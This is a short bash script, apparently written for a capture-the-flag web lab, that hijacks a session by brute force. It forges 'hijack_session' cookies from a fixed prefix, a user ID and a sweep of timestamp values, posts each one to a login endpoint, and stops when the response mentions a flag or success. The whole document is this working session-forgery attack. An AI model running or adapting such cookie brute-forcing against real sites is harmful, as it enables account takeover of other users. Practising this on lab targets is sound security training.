PREFIX="2134e21a-0a31-4e2d-a3c"
ID="3505899"
URL="http://web0x01.hbtn/api/a1/hijack_session/login"

for i in {459..516}; do
    TS="17687634$i"
    COOKIE="hijack_session=$PREFIX-$ID-$TS"

    echo "Testing Timestamp: $TS"


    response=$(curl -s -X POST "$URL" \
      -H 'Content-Type: application/json' \
      -H "Cookie: $COOKIE" \
      --data-raw '{"email":"fake@fake.com","password":"fake"}')

    if echo "$response" | grep -iE "flag|success|congrats"; then
        echo "---------------------------------------------------"
        echo "SUCCESS FOUND!"
        echo "Cookie used: $COOKIE"
        echo "Response: $response"
        break
    fi
done
